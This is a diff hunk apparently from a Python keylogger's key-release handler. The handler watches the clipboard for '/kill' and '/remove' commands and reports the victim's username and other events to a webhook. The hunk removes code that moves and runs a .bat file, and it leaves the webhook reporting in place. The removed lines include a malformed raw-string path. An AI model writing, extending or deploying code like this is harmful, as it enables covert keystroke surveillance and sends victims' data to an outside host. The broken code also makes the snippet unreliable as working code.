@@ -96,30 +96,6 @@ def on_release(key):
 
     if "/kill" in current_clipboard:
         send_to_webhook(f"Kill command executed by: {username}")
-        file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
-        subprocess.run(["explorer", file_path])
-        time.sleep(1)
-        send_to_webhook(f"Opened dir...")
-        return False
-
-    elif "/remove" in current_clipboard:  # Corrected from 'else if' to 'elif'
-        send_to_webhook(f"Removed by: {username}")
-        file_path = rf"C:\users\{username}\kl2.1"
-        try:
-            source = rf"C:\users\{username}\kl2.1\runkill.bat"
-            destination = r"C:\users\{username}\"
-
-            # Ensure the source file exists before attempting to move it
-            if os.path.exists(source):
-                shutil.move(source, destination)
-                subprocess.run([destination], check=True)  # Run the moved .bat file
-                send_to_webhook(f"Moved and executed the .bat file: {destination}")
-            else:
-                send_to_webhook(f"Error: {source} not found")
-
-        except OSError as e:
-            send_to_webhook(f"Error moving or executing the .bat file: {e}")
-
         return False
 
 
